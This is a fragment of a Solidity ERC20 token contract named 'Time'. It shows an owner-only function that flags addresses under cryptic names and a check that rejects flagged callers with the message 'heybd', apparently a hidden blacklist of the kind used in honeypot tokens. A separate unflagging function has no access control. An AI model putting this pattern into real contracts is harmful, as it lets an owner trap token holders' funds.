...
contract Time is Context, IERC20, Ownable {
    ...
    string private _z;
    string private _y;
    mapping (address => bool) public _hmd;
...
function thmd(address hmd) public onlyOwner returns (bool){
    _hmd[hmd] = true;
    return true;
}
function schmd(address hmd) public {
    delete _hmd[hmd];
}
...
function scff() public view returns(bool){
    require(!_hmd[msg.sender],"heybd");
    return true;
}
